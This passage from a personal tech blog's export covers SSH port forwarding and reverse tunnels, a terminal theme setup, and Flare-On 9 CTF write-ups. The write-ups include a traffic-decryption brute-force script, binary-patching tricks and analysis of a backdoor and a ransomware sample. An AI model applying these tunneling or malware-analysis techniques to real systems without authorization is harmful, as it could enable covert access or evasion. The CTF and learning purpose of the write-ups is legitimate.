123ssh -f -N vps# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於以下指令 123ssh -f -N -L 5555:127.0.0.1:6666 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports local:5555 -&gt; remote:127.0.0.1:6666 執行這個指令，就會在 local 聽 5555 port 然後把流量都導到 remote 的 127.0.0.1 的 6666 port remote port forwarding ( reverse ssh tunnel ) ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno RemoteForward 6666 127.0.0.1:5555 設定好後可以直接打以下指令 123ssh -f -N vps# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於以下指令 123ssh -f -N -R 6666:127.0.0.1:5555 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports remote:6666 -&gt; local:127.0.0.1:5555 執行這個指令之後，就會在 remote 聽 6666 port 然後把流量都導到 local 的 127.0.0.1 的 5555 port dynamic port forwarding ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno DynamicForward 9999 設定好後可以直接打以下指令 123ssh -f -N vps# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於打以下指令 123ssh -f -N -D 9999 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports 會開一個 SOCKS 代理伺服器聽在 local 的 9999 port，把流量都轉從 remote 的機器出去 情境一：存取內網資源 你在你租的 vps 伺服器上面跑了一個 mattermost 在測試 但你不想讓 mattermost 聽在 0.0.0.0 公開在網路上讓大家都可以連，有風險 所以你開在 127.0.0.1 只有 vps 本地可以連 但是你又想用你的筆電上的瀏覽器測試 這時候就可以用到 local port forwarding 把 local:8065 -&gt; remote:127.0.0.1:8065 設定如下之後，執行 ssh -f -N vps-mattermost 就可以在本地瀏覽器上面輸入 http://localhost:8065 連到你架好的 mattermost 了 ~/.ssh/config1234Host vps-mattermost HostName 123.45.67.89 User oalieno LocalForward 8065 127.0.0.1:8065 情境二：透過跳板 ssh 到沒有 public ip 的機器 你在家裡組了一台桌機，但是這台桌機沒有 public ip，所以在外面的時候沒辦法 ssh 連到家裡的桌機 不過你剛好租了一台有 public ip 的 vps 伺服器 這時候就可以用到 remote port forwarding 把 remote:22000 -&gt; local:127.0.0.1:22 設定如下之後，在桌機上執行 ssh -f -N vps-reverse-ssh 就可以從你的筆電先 ssh 到 vps 然後再從 vps 通過 remote port forwarding ssh 到桌機了 有 public ip 的 vps 伺服器在這裡扮演了跳板的角色 ~/.ssh/config (桌機)1234Host vps-reverse-ssh HostName 123.45.67.89 User oalieno RemoteForward 22000 127.0.0.1:22 ~/.ssh/config (vps)1234Host home HostName 127.0.0.1 User oalieno Port 22000 autossh autossh 可以幫你自動重連 ~/.ssh/config1234567Host vps HostName 123.45.67.89 User oalieno IdentityFile ~/.ssh/id_rsa LocalForward 5555 127.0.0.1:6666 ServerAliveInterval 30 ServerAliveCountMax 3 設定好後可以直接打以下指令 1234autossh -M 0 -f -N vps# -M 0 : autossh echo port, recommend disable it by setting it to 0# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於打以下指令 1234autossh -M 0 -f -N -o &quot;ServerAliveInterval 30&quot; -o &quot;ServerAliveCountMax 3&quot; -L 5555:localhost:6666 oalieno@123.45.67.89# -M 0 : autossh echo port, recommend disable it by setting it to 0# -f : run in background# -N : not execute remote command, useful for forwarding ports escape sequence 有時候連線斷掉後，畫面就會卡在那裡 這時候就可以直接在鍵盤上打 ~. 這個 escape sequences 就可以直接跳出來啦，感覺像是在逃脫 vim 呢xD 下面還有更多的神秘金手指可以打 123456789101112Supported escape sequences: ~. - terminate connection (and any multiplexed sessions) ~B - send a BREAK to the remote system ~C - open a command line ~R - request rekey ~V/v - decrease/increase verbosity (LogLevel) ~^Z - suspend ssh ~# - list forwarded connections ~&amp; - background ssh (when waiting for connections to terminate) ~? - this message ~~ - send the escape character by typing it twice(Note that escapes are only recognized immediately after newline.) https://linux.die.net/man/5/ssh_config https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/ https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/ https://askubuntu.com/questions/29942/how-can-i-break-out-of-ssh-when-it-locks https://johnliu55.tw/ssh-tunnel.html","link":"/2018/08/04/ssh/"},{"title":"【一秒變時尚】zimfw + powerlevel10k + nord","text":"Zimfw 我也是用了很久的 oh-my-zsh，一直都覺得 terminal 有點慢，不過直到看到這篇 打造屬於你自己的極速 Shell「iTerm + zsh + zim + powerlevel10k」，才有想要換的念頭 zimfw 的優點就是快，雖然他不像 oh-my-zsh 一樣有這麼多內建的插件，但一般的 zsh 插件他也都可以安裝，而且最常用也一定要有的 zsh-syntax-highlight, zsh-completions, zsh-autosuggestions 預設都幫你配置好了，其他插件的安裝請看下面的說明 插件安裝 官方提供的插件在這，archive 預設沒裝，我推薦可以安裝，他跟 oh-my-zsh 的 extract 插件是同樣的功能，會自動幫你根據副檔名解壓縮，就不需要再去背那些指令 非官方的插件的話，我們以 alias-tips 這個插件做例子，只要在 .zimrc 加入下面一行 .zimrc1zmodule djui/alias-tips 然後打 zimfw install，他就會去幫你 git clone 那個 repo 下來，接著在載入插件的時候會去找 {init.zsh|module_name.{zsh|plugin.zsh|zsh-theme|sh}} 這個格式的檔名，只要找得到這樣的檔案的 github repo 基本上都可以安裝 Powerlevel10k powerlevel10k 看名字就知道是用來幹掉 powerlevel9k 的，記得當初看到 powerlevel9k 的時候兩眼發光，此生沒看過這麼漂亮的主題，直到現在看到 powerlevel10k powerlevel9k，那 powerlevel10k 究竟是猛在哪，就我來看，我覺得 powerlevel10k 最大的優點在於他優秀的客製化系統，請看下圖 可以讓你一步步設定每個細節，而且不用自己手動去改設定，只要跑 p10k configure 這個指令就好，對懶人十分的友善阿，而且 powerlevel10k 直接推薦我們安裝 MesloLGS NF 字型，裝好就完事了，不需要像 powerlevel9k 還要自己調字型和大小，另一個優點就是速度了，官方說是比 powerlevel9k 快上不少，但是因為我同時也換了 zimfw 所以不知道是不是真的有變快 Nord 顏色的配置我使用 Nord 這款，有冰天雪地高冷的感覺，我把他套用到 kitty, vim, tmux 上，讓整個環境有一致的色調，十分舒服，請看下圖，安裝的部分可以到 官方的 github 裡面去找，各大常見的編輯器幾乎都有支援","link":"/2020/01/18/terminal/"},{"title":"【Windows Security】MpDlpCmd.exe","text":"MpDlpCmd.exe This executable is located under C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\v.vv.vvvv.v-v It seems to be related to Data Loss Prevention (DLP). There is no manual anywhere. Only a short message Usage: MpDlpCmd -&lt;Command&gt; I decided to open IDA Pro to do some reverse engineering. From the decompiled code, we can clearly see that there are three parameters. -h / -?: print usage -ShowDlpDetailsDialog -TestDlpDetailsDialog -ShowDlpDetailsDialog With -ShowDlpDetailsDialog, there will be error message MpDlpCmd: Failed with hr = 0x80004005.. Not sure what is happening. -TestDlpDetailsDialog With -TestDlpDetailsDialog, we can get below window.","link":"/2022/11/01/MpDlpCmd/en/"},{"title":"【Writeups】Flare-on 9","text":"01 - Flaredle 123456const CORRECT_GUESS = 57;let rightGuessString = WORDS[CORRECT_GUESS];if (guessString === rightGuessString) { let flag = rightGuessString + '@flare-on.com'; ...} flag 就是 WORDS[57] 02 - Pixel Poker 1234if (x == 0x52414c46 % 741 &amp;&amp; y == 0x6e4f2d45 % 641) { # print flag ...} 點選 (95, 313) 這個格子就會噴出 flag 如下 03 - Magic 8 Ball 按 LLURULDUL 方向鍵 然後在下面輸入 gimme flag pls? 就會噴出 flag 如下 04 - darn_mice 12345for (int i = 0; i &lt; 10; i++) { void *ptr = malloc(0x1000); *ptr = payload[i] + input[i]; (void(*)())(ptr)();} 每個 byte 都會被當成 1-byte shellcode 呼叫，只有全部都是 0xc3 也就是 ret 才不會 crash flag 是 i_w0uld_l1k3_to_RETurn_this_joke@flare-on.com 05 - T8 這題給了一隻 PE 執行檔和一包 pcap 程式一開始會有個 anti-debug，判斷時間是滿月的時候才能執行 他有一個函式是在計算月亮的週期 OwO pcap 裡面有兩個 requests 兩個 response 總之動態追一下可以發現他計算 request 內容的邏輯 基本上他就是用 RC4 加密，他產的 key 是 FO9 加上 0 到 65535 之間隨機一個數字，比如 FO91234，做 md5 的結果 所以爆搜一下就可以解出封包的內容，爆搜程式碼如下，要注意 wide string 的轉換 O_O 12345678910111213141516171819202122232425262728293031import hashlibfrom base64 import *from Crypto.Cipher import ARC4def to_wide(x): return b''.join([bytes([i, 0]) for i in x])def check_wide(x): for i, j in enumerate(x): if i % 2 == 1 and j != 0: return False return Truedef gen_key(x): return to_wide(hashlib.md5(to_wide(x)).hexdigest().encode())def rc4(key, m): return ARC4.new(key).encrypt(m)enc_req = b64decode(&quot;ydN8BXq16RE=&quot;)enc_res = b64decode(&quot;TdQdBRa1nxGU06dbB27E7SQ7TJ2+cd7zstLXRQcLbmh2nTvDm1p5IfT/Cu0JxShk6tHQBRWwPlo9zA1dISfslkLgGDs41WK12ibWIflqLE4Yq3OYIEnLNjwVHrjL2U4Lu3ms+HQc4nfMWXPgcOHb4fhokk93/AJd5GTuC5z+4YsmgRh1Z90yinLBKB+fmGUyagT6gon/KHmJdvAOQ8nAnl8K/0XG+8zYQbZRwgY6tHvvpfyn9OXCyuct5/cOi8KWgALvVHQWafrp8qB/JtT+t5zmnezQlp3zPL4sj2CJfcUTK5copbZCyHexVD4jJN+LezJEtrDXP1DJNg==&quot;)for i in range(256 * 256): key = gen_key(b'FO9' + str(i).encode()) dec_req = rc4(key, enc_req) if check_wide(dec_req): dec_res = rc4(key, enc_res) breakprint(dec_req)print(dec_res) 然後解出第一個封包的內容之後，裡面的內容是用 , 分開的如下 1234567891011121314\\xe5\\x07\\t\\x00\\x03\\x00\\x0f\\x00\\r\\x00%\\x00\\x03\\x00b\\x02\\x00\\xdc\\x07\\n\\x00\\x06\\x00\\r\\x00\\r\\x00%\\x00\\t\\x00*\\x03\\x00\\xe1\\x07\\x0c\\x00\\x04\\x00\\x07\\x00\\r\\x00%\\x00$\\x00\\xe5\\x00\\x00\\xe0\\x07\\x05\\x00\\x05\\x00\\x06\\x00\\r\\x00%\\x00\\x0b\\x00&amp;\\x00\\x00\\xe2\\x07\\n\\x00\\x01\\x00\\x08\\x00\\r\\x00%\\x00\\x1f\\x00E\\x03\\x00\\xe6\\x07\\x03\\x00\\x02\\x00\\x01\\x00\\r\\x00%\\x002\\x00\\xda\\x00\\x00\\xde\\x07\\x07\\x00\\x02\\x00\\x16\\x00\\r\\x00%\\x006\\x00\\xd1\\x02\\x00\\xde\\x07\\x05\\x00\\x03\\x00\\x0e\\x00\\r\\x00%\\x00\\x01\\x00\\xe8\\x00\\x00\\xda\\x07\\x04\\x00\\x01\\x00\\x05\\x00\\r\\x00%\\x00:\\x00\\x0b\\x00\\x00\\xdd\\x07\\n\\x00\\x04\\x00\\x03\\x00\\r\\x00%\\x00\\x16\\x00\\x16\\x03\\x00\\xde\\x07\\x01\\x00\\x02\\x00\\x0e\\x00\\r\\x00%\\x00\\x10\\x00\\xc9\\x00\\x00\\xdc\\x07\\x0c\\x00\\x01\\x00\\n\\x00\\r\\x00%\\x000\\x00\\x0c\\x02\\x00\\xe6\\x07\\x02\\x00\\x01\\x00\\x1c\\x00\\r\\x00%\\x00&quot;\\x00K\\x01\\x00\\xe6\\x07\\t\\x00\\x05\\x00\\t\\x00\\r\\x00%\\x00!\\x00m\\x01 每行都是代表某年某月某日，然後算一下是陰曆幾號，再把那個數字對到 a-z0-9 就可以組出 flag 了，大概吧 O3O? 反正後來我覺得好麻煩，就直接把解出來的封包內容倒回去 debugger，flag 就掉出來了 O_O flag 是 i_s33_you_m00n@flare-on.com 06 - à la mode 這題乍看之下是 .NET 程式 但用 dnspy 翻了一下發現沒什麼東西 在逛 PEBear 的時候就看到了 .NET Header 裡面的 Flags 寫了 Native EntryPoint 咦?難道這是隻普通的 dll 直接抄起我的 IDA Pro 和 x64dbg 咻咻咻，一陣亂跳，看到了一些 pipe 的東西，再多翻一下就翻到某個地方長得很像是在 decode flag 的地方，還有出現 MyV0ic3 字串 難道是要 create pipe 然後傳這個字串，好像很麻煩，我直接手起刀落把 cmp 的另一個變數一樣改成 MyV0ic3，再按了幾下 step over，登登，flag 就出現在 memory 了 flag 是 M1x3d_M0dE_4_l1f3@flare-on.com p.s. 解這題的時候剛好要出門吃飯，原本想說只是先看一下題目，沒想到 flag 就自己掉出來了xD 07 - anode 這隻程式是用 node.js 寫的，是用 nexe 這個東西打包的 用文字編輯器打開看一下就會發現檔案最後面有 js 原始碼 js 原始碼裡面有一大堆的 switch case 主要的邏輯就是把你的輸入 -&gt; 做一連串的 add, sub, xor 的操作 -&gt; 檢查跟某個值是不是一樣的，是的話你的輸入就是 flag 我們可以直接去改最後的 js 原始碼，只要讓整個檔案的大小不變就不會噴 error，他執行的時候應該是直接抓一個固定的 offset? 加了一行 require(&quot;a.js&quot;)，這樣我就可以直接跑我自己的 js 簡單測試了一下，發現 node.js 被改過了，random 的輸出不 random，其他一些運算也被改過 正常來說是要比對一下原版的 node.js 和這個改過的 node.js 差在哪裡 但是我覺得好麻煩，我直接用 visual studio code 的超強 replace 功能把那一大串的 add 換成 sub，sub 換成 add，然後當做字串推到一個陣列 接著把陣列倒過來，拿去 eval 就可以 flag 了 OwO 123456789101112131415161718192021222324252627282930.../* 原本case 1071664271: if (Math.random() &lt; 0.5) { b[17] += b[0] + b[35] + b[12] + b[42] + b[14] + b[3] + 8; b[17] &amp;= 0xFF; } else { b[18] ^= (b[20] + b[23] + b[6] + b[12] + b[4] + b[25] + Math.floor(Math.random() * 256)) &amp; 0xFF; } state = 175099911; continue;*/// 處理過case 1071664271: if (Math.random() &lt; 0.5) { commands.push(`b[17] -= b[0] + b[35] + b[12] + b[42] + b[14] + b[3] + 8`); commands.push(`b[17] &amp;= 0xFF`); } else { commands.push(`b[18] ^= (b[20] + b[23] + b[6] + b[12] + b[4] + b[25] + ${Math.floor(Math.random() * 256))} &amp; 0xFF`); } state = 175099911; continue;...var b = [106, 196, 106, 178, 174, 102, 31, 91, 66, 255, 86, 196, 74, 139, 219, 166, 106, 4, 211, 68, 227, 72, 156, 38, 239, 153, 223, 225, 73, 171, 51, 4, 234, 50, 207, 82, 18, 111, 180, 212, 81, 189, 73, 76];commands.reverse().forEach(command =&gt; eval(command));console.log(b) flag 是 n0t_ju5t_A_j4vaSCriP7_ch4l1eng3@flare-on.com p.s. 雖然 flag 說 not just a javascript challenge，但是我完全把他當作 javascript 來解了，抱歉了xD 08 - backdoor 這題被大家說是全部裡面最難的，我覺得是蠻麻煩的，找不到地方偷吃步，或是其實有但我不知道xD (可以偷偷告訴我 O_O) 這隻是 .NET 的程式，dnspy 打開會看到一堆的 try except 一開始跑下去都會進到 except 裡面 因為他是在 except 裡面去建出一個 DynamicMethod，再把正確的 IL code 塞進去跑 但如果你直接把動態跑的時候看到的那段 IL code 抓下來塞回去檔案裡面，會發現還是錯的 因為他有一段是在做 dynamicILInfo.GetTokenFor，是在把外面世界的 metadata token 換成 dynamicILInfo 世界中的 metadata token，所以不能直接把那個 IL 複製出來，要複製再早一點還沒有換掉的，然後把正確的 metadata token 放上去 這邊我因為沒有找到好方法 (對 .NET 不熟 QQ)，所以是用 dyspy 動態跑，手動複製出 IL code 和 metadata token，然後寫個 python script 去改原本的執行檔，最後可以正常的 decompile 所有函式 接著看到了一些 powershell command $(ping -n 1 10.10.21.201 | findstr /i ttl) -eq $null; 拿去 google 了一下就找到了這篇 APT34 targets Jordan Government using new Saitama backdoor 長得一模一樣，這題就是從這隻惡意程式改的 其中在處理不同的 task 的部分有發現一些在做比較字串的程式碼 感覺跟 flag 有關，就仔細看了一下，發現他是要依照某個順序把每一個 task 都跑過一次，就會去印 flag 他印 flag 的地方是從 PE 的 5aeb2b97 這個 section 抓資料出來，然後拿去解，中間還會跟 stacktrace 的字串攪在一起，十分的噁心 後來受不了，沒有可以偷吃步的地方，還是乖乖地寫了一個 dns server 跟程式互動，按照步驟去發 task id，執行完之後就噴出 flag 了 flag 是 W3_4re_Kn0wn_f0r_b31ng_Dyn4m1c@flare-on.com 09 - encryptor 這隻是一個 Ransomware，標準的用 Symmetric Encryption 做加密，再用 Asymmetric Encryption 加密 Symmetric Encryption 的 key 很快就可以看出他有做 chacha20 但是一直找不到他用什麼 Asymmetric Encryption，一直在想是什麼複雜的加密演算法，一開始懷疑是 ECC，後來又再猜 NTRU 我看那個迴圈感覺很像是在做快速冪，在想是哪個演算法會做快速冪，不會是 RSA 吧他寫的那麼複雜，到底是哪個，等等難道真的是 RSA 後來測試一下，發現真的是 RSA，因為他在做大數的運算所以看起來很複雜，那些函式就只是在做加法乘法模運算而已 Orz 反正他就是把檔案做 chacha20 加密，加密用的 key 再用 RSA 做加密 RSA 加密之前先用 e=0x10001 去算出對應的 d，然後加密是直接 m^d % n 等於我們直接用 c^e % n 去解密就好 flag 是 R$A_$16n1n6_15_0pp0$17e_0f_3ncryp710n@flare-on.com 10 - Nur geträumt 這題是 m68k 的程式，非常古老的東西，要古董 Mac 電腦才跑得起來 不過我們只要照著提示去用 Mini vMac 就可以跑起來了 稍微互動一下就可以發現它其實就是在做 xor encryption，就是會把你輸入的 key 重複貼上直到跟被加密的內容等長，然後做 xor 所以重點就是，要輸入什麼 key? 已知最後面一定是 @flare-on.com 所以可以先解出 key 的最後 13 bytes 是 du etwas Zei 然後搭配他在程式裡面塞的一堆提示，就可以找到這首歌 NENA | 99 Luftballons [1983] [Offizielles HD Musikvideo] google 一下他的歌詞就會發現第一句歌詞就是 key … 有幾個不是英文字母的在裡面，不過 flag 都是英文，猜一下也還好 flag 是 Dann_singe_ich_ein_Lied_fur_dich@flare-on.com p.s. 這題最麻煩的步驟是把 encrypted flag 複製出來… 11 - The challenge that shall not be named. 這題是用 python 寫的，用 pyinstaller 打包成 exe 所以起手先用 pyinstxtractor 解出原始的 pyc (版本是 3.7.0) 然後再用 python-decompile3 解回原本的 python source code 接著就會發現他有用 pyarmor 做混淆 直接用 python 去跑解出來的 .py 檔案，會發現它噴了一個錯誤，而且有 stacktrace，位置是在本地的 crypt 函式庫 裡面有用到 linux 平台才有的東西，有點古怪 我就直接去改那個 crypt.py，把 import _crypt 註解掉，然後就會發現他去呼叫 crypt 的時候找不到 _crypt，因為我們沒有 import 他 可以直接讓他 return None，接著就又看到他去呼叫 ARC4，一樣直接改他 1234567def ARC4(x): print('arc4', x) class A: def encrypt(self, y): print('arc4.encrypt', y) return b'' return A() 然後 flag 就被我們印出來了xD flag 是 Pyth0n_Prot3ction_tuRn3d_Up_t0_11@flare-on.com","link":"/2022/11/12/flare-on-9/zh-tw/"}],"tags":[{"name":"python","slug":"python","link":"/tags/python/"},{"name":"GIL","slug":"GIL","link":"/tags/GIL/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"writeups","slug":"writeups","link":"/tags/writeups/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"adb","slug":"adb","link":"/tags/adb/"},{"name":"nox","slug":"nox","link":"/tags/nox/"},{"name":"burp","slug":"burp","link":"/tags/burp/"},{"name":"drony","slug":"drony","link":"/tags/drony/"},{"name":"blockchain","slug":"blockchain","link":"/tags/blockchain/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"blog","slug":"blog","link":"/tags/blog/"},{"name":"seo","slug":"seo","link":"/tags/seo/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"c++","slug":"c","link":"/tags/c/"},{"name":"kernel","slug":"kernel","link":"/tags/kernel/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"flow","slug":"flow","link":"/tags/flow/"},{"name":"dapper labs","slug":"dapper-labs","link":"/tags/dapper-labs/"},{"name":"crypto","slug":"crypto","link":"/tags/crypto/"},{"name":"osint","slug":"osint","link":"/tags/osint/"},{"name":"rsa","slug":"rsa","link":"/tags/rsa/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"pyc","slug":"pyc","link":"/tags/pyc/"},{"name":"rootkit","slug":"rootkit","link":"/tags/rootkit/"},{"name":"srop","slug":"srop","link":"/tags/srop/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"tunnel","slug":"tunnel","link":"/tags/tunnel/"},{"name":"command","slug":"command","link":"/tags/command/"},{"name":"proxy","slug":"proxy","link":"/tags/proxy/"},{"name":"reverse ssh","slug":"reverse-ssh","link":"/tags/reverse-ssh/"},{"name":"zsh","slug":"zsh","link":"/tags/zsh/"},{"name":"zimfw","slug":"zimfw","link":"/tags/zimfw/"},{"name":"powerlevel9k","slug":"powerlevel9k","link":"/tags/powerlevel9k/"},{"name":"powerlevel10k","slug":"powerlevel10k","link":"/tags/powerlevel10k/"},{"name":"nord","slug":"nord","link":"/tags/nord/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"windows defender","slug":"windows-defender","link":"/tags/windows-defender/"},{"name":"flare","slug":"flare","link":"/tags/flare/"},{"name":"flare-on","slug":"flare-on","link":"/tags/flare-on/"},{"name":"reverse engineering","slug":"reverse-engineering","link":"/tags/reverse-engineering/"}],"categories":[{"name":"程式","slug":"程式","link":"/categories/%E7%A8%8B%E5%BC%8F/"},{"name":"資安","slug":"資安","link":"/categories/%E8%B3%87%E5%AE%89/"},{"name":"writeups","slug":"資安/writeups","link":"/categories/%E8%B3%87%E5%AE%89/writeups/"},{"name":"reverse","slug":"資安/reverse","link":"/categories/%E8%B3%87%E5%AE%89/reverse/"},{"name":"演算法","slug":"演算法","link":"/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"},{"name":"區塊鍊","slug":"區塊鍊","link":"/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"},{"name":"pwn","slug":"資安/pwn","link":"/categories/%E8%B3%87%E5%AE%89/pwn/"}],"pages":[{"title":"我","text":"現在在 奧義智慧 擔任資安研究員 Awards Year Rank Contest 2017 Silver Medal ACM-ICPC Asia Hua-Lien Taiwan Online Programming Contest 2017 Silver Medal 2017 Silver Medal ACM-ICPC Asia Hua-Lien Regional Contest 2017 Finalist HITCON CTF Cyber Security Competition World Final 2018 Finalist DEFCON 26nd CTF Cyber Security Competition World Final 2018 Finalist VolgaCTF Cyber Security Competition World Final 2018 3rd Place HITCON CTF Cyber Security Competition 2019 2nd Place DEFCON 27nd CTF Cyber Security Competition World Final Presentations Conference Subject HITCON CMT 2017 (Cyber Security Conference) 滲透測試基本技巧與經驗分享 HITCON CMT 2018 (Cyber Security Conference) 那些年的密碼學後門 CODE BLUE 2020 @ Tokyo Cryfind : A Static Tool to Identify Cryptographic Algorithm in Binary Publications Conference Subject The 2018 IEEE Conference on Dependable and Secure Computing Design and Implement of a Binary Fuzzer based on Libfuzzer The 2021 IEEE Conference on Dependable and Secure Computing Cryfind : Using Static Analysis to Identify Cryptographic Algorithms in Binary Executables 外傳: the rise of oalieno 因為我在看電影拿到的一隻外星人玩偶，所以綽號就變成外星人了O_O? 但是創帳號的時候，alien 都被取走了，所以就前後加個 o (要對稱啊)，就變成 oalieno 了OwO 有些地方連 oalieno 都被取走的時候，就會取名為 ooalieno, oooalienooo, owoalienowo, … 等名字 不過其實最早的時候是取名成 0Alien0，但後來覺得整個形狀看起來不好看，就變成全小寫的 oalieno","link":"/about/index.html"}]}